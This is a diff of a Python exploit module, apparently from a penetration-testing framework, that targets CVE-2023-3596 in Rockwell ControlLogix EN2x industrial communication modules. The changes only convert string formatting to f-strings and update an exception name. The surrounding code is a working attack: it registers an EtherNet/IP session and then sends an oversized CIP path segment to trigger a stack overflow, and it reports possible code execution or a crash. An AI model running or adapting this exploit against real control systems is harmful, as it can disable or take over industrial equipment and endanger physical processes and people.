@@ -79,7 +79,7 @@ class Exploit(Exploit):
             print_info("Reference: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-191a")
             return
 
-        print_status("[CVE-2023-3596] Targeting {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2023-3596] Targeting {self.target}:{self.port} ...")
 
         # Phase 1: RegisterSession
         EIP_REGISTER = struct.pack("<HHIIQIH", 0x0065, 4, 0, 0, 0, 0) + struct.pack("<HH", 1, 0)
@@ -94,9 +94,9 @@ class Exploit(Exploit):
                 sock.close()
                 return
             session_handle = struct.unpack_from("<I", resp, 4)[0]
-            print_success("[CVE-2023-3596] Session: 0x{:08X}".format(session_handle))
+            print_success(f"[CVE-2023-3596] Session: 0x{session_handle:08X}")
         except Exception as exc:
-            print_error("[CVE-2023-3596] Connection failed: {}".format(exc))
+            print_error(f"[CVE-2023-3596] Connection failed: {exc}")
             return
 
         # Phase 2: Oversized CIP path segment -> stack overflow
@@ -118,13 +118,13 @@ class Exploit(Exploit):
             time.sleep(0.5)
             try:
                 rsp = sock.recv(256)
-                print_success("[CVE-2023-3596] Stack overflow payload delivered ({} bytes sent)".format(len(EIP_SENDRRDATA)))
+                print_success(f"[CVE-2023-3596] Stack overflow payload delivered ({len(EIP_SENDRRDATA)} bytes sent)")
                 if len(rsp) < 4:
                     print_success("[CVE-2023-3596] EN2x silent after overflow — possible code execution or crash")
-            except socket.timeout:
+            except TimeoutError:
                 print_success("[CVE-2023-3596] No response (EN2x timeout) — overflow likely triggered")
         except Exception as exc:
-            print_error("[CVE-2023-3596] Payload send failed: {}".format(exc))
+            print_error(f"[CVE-2023-3596] Payload send failed: {exc}")
         finally:
             try:
                 sock.close()
